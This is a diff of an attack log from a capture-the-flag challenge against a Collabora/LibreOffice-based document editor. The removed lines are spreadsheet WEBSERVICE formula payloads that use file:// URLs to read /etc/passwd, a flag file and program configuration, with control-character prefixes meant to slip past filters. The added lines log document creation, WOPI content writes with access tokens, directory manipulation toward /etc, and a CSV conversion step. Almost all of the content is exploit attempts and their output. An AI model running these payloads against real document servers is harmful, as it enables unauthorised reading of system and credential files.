@@ -1,48 +1,21 @@
+HTTP POST /login STATUS 200 BYTES 13121 FINAL http://njwqato3tpdz0t6k.instances.ctfcup.online/
+HTTP POST /docs/create STATUS 200 BYTES 10706 FINAL http://njwqato3tpdz0t6k.instances.ctfcup.online/edit/d4
+HTTP GET /edit/d4 STATUS 200 BYTES 10706 FINAL http://njwqato3tpdz0t6k.instances.ctfcup.online/edit/d4
+HTTP POST /wopi/files/d4/contents?access_token=3RQZmYoLPO2UnsrXonbzTrGFEE5aErLKXe6mtXFbyi8 STATUS 200 BYTES 3 FINAL http://njwqato3tpdz0t6k.instances.ctfcup.online/wopi/files/d4/contents?access_token=3RQZmYoLPO2UnsrXonbzTrGFEE5aErLKXe6mtXFbyi8
+ODB root-flat DOCID d4 DIRECTORY / PUT_STATUS 200 PUT_BODY {}
 
-=== COM.MICROSOFT.WEBSERVICE(" file://webapp/lo/program/versionrc")
-STATUS 200 BYTES 8 RESPONSE #VALUE!
+HTTP POST /docs/create STATUS 200 BYTES 10705 FINAL http://njwqato3tpdz0t6k.instances.ctfcup.online/edit/d5
+HTTP GET /edit/d5 STATUS 200 BYTES 10705 FINAL http://njwqato3tpdz0t6k.instances.ctfcup.online/edit/d5
+HTTP POST /wopi/files/d5/contents?access_token=O7R39gJv_X6V1wAV3ziOP5IGf8qCxvY_8MXT0KzT_kg STATUS 200 BYTES 3 FINAL http://njwqato3tpdz0t6k.instances.ctfcup.online/wopi/files/d5/contents?access_token=O7R39gJv_X6V1wAV3ziOP5IGf8qCxvY_8MXT0KzT_kg
+ODB etc-flat DOCID d5 DIRECTORY /etc PUT_STATUS 200 PUT_BODY {}
 
+HTTP POST /docs/create STATUS 200 BYTES 10704 FINAL http://njwqato3tpdz0t6k.instances.ctfcup.online/edit/d6
+HTTP GET /edit/d6 STATUS 200 BYTES 10704 FINAL http://njwqato3tpdz0t6k.instances.ctfcup.online/edit/d6
+HTTP POST /wopi/files/d6/contents?access_token=kw6mYTjweGExxIvmPrzktbZTY1o30_zl08xdbIbQgD0 STATUS 200 BYTES 3 FINAL http://njwqato3tpdz0t6k.instances.ctfcup.online/wopi/files/d6/contents?access_token=kw6mYTjweGExxIvmPrzktbZTY1o30_zl08xdbIbQgD0
+ODB lo-flat DOCID d6 DIRECTORY /lo/program PUT_STATUS 200 PUT_BODY {}
 
-=== COM.MICROSOFT.WEBSERVICE(" file://webapp/etc/passwd")
-STATUS 200 BYTES 8 RESPONSE #VALUE!
+HTTP POST /cool/convert-to/csv STATUS 200 BYTES 1 FINAL http://njwqato3tpdz0t6k.instances.ctfcup.online/cool/convert-to/csv
 
+=== FINAL_CSV STATUS 200 ===
 
-=== COM.MICROSOFT.WEBSERVICE(" file://webapp/flag")
-STATUS 200 BYTES 8 RESPONSE #VALUE!
-
-
-=== COM.MICROSOFT.WEBSERVICE(" file://localhost/lo/program/versionrc")
-STATUS 200 BYTES 8 RESPONSE #VALUE!
-
-
-=== COM.MICROSOFT.WEBSERVICE(" file://localhost/flag")
-STATUS 200 BYTES 8 RESPONSE #VALUE!
-
-
-=== COM.MICROSOFT.WEBSERVICE(" file://127.0.0.1/flag")
-STATUS 200 BYTES 8 RESPONSE #VALUE!
-
-
-=== COM.MICROSOFT.WEBSERVICE(" file:///lo/program/versionrc")
-STATUS 200 BYTES 8 RESPONSE #VALUE!
-
-
-=== COM.MICROSOFT.WEBSERVICE(CHAR(9)&"file://webapp/flag")
-STATUS 200 BYTES 8 RESPONSE #VALUE!
-
-
-=== COM.MICROSOFT.WEBSERVICE(CHAR(10)&"file://webapp/flag")
-STATUS 200 BYTES 8 RESPONSE #VALUE!
-
-
-=== COM.MICROSOFT.WEBSERVICE(CHAR(11)&"file://webapp/flag")
-STATUS 200 BYTES 8 RESPONSE #VALUE!
-
-
-=== COM.MICROSOFT.WEBSERVICE(CHAR(12)&"file://webapp/flag")
-STATUS 200 BYTES 8 RESPONSE #VALUE!
-
-
-=== COM.MICROSOFT.WEBSERVICE(CHAR(13)&"file://webapp/flag")
-STATUS 200 BYTES 8 RESPONSE #VALUE!
 
